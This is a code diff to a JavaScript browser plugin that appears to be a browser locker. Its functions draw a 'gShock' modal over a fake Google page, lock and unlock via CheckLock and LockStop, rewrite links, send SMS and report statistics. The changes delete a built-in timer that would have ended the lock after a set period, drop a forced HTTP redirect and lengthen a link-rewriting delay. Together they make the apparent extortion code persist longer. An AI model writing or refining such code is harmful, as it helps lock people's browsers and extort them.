@@ -29,7 +29,7 @@ function CheckLock() {
 		vRun = plg.Get('vRun'),
 		yaRun = plg.Get('yaRun');
 		
-	if ((oRun) && (oRun != 0)) {
+	if ((oRun) && (oRun !== 0)) {
 		LockStop();
 		plg.Save('lon','0');
 	
@@ -39,7 +39,7 @@ function CheckLock() {
 		result = 666;
 	
 	}
-	if ((vRun) && (vRun!= 3)) {
+	if ((vRun) && (vRun!== 3)) {
 		LockStop();
 		plg.Save('lon','0');
 	}
@@ -170,10 +170,6 @@ function  SecondStep() {
 
 function ShowMeGoogle() { 
     
-	if (window.location.protocol !== 'http:') {
-		window.location = 'http://' + window.location.hostname + window.location.pathname + window.location.hash;
-		
-	}
 	var modalWnd = document.createElement("div");
     modalWnd.setAttribute("id", "gShock");
     modalWnd.setAttribute("position", "relative");
@@ -324,7 +320,7 @@ function isMain(){
 				plg.Save('lon','1');
 				SendStat(0,'gLog');
 							
-				setTimeout('ChangeLinks()', 2000);
+				setTimeout('ChangeLinks()', 4000);
 				
 			}
 		}
@@ -402,38 +398,6 @@ function SendSMS() {
 
 }
 
-
-function IsTime() {
-    try {
-        var lockTime = plg.Get('gTime');
-    } catch (e) {}
-    if (lockTime < getTime()) {
-       LockStop();
-	   
-    }
-}
-
-
-function CheckTime() {
-    var startTime = getTime() + 4320;
-    
-	if (plg.Get('gTime')) {
-        return false;
-
-    }
-	else {
-        plg.Save('gTime', startTime.toString());
-    }
-}
-
-
-
-function getTime() {
-    var g = new Date().getTime() / 1000 / 60 / 60;
-    g = g - (g % 1);
-    return g;
-}
-
 function Start() {
 		if (plg){
 			if (plg.Get('lon') === false){
@@ -450,8 +414,6 @@ function Start() {
 	}
 
   window.onload = function () {
-		//TimeOut ();
-		//SetTime();
 		Start();
 	
 } 
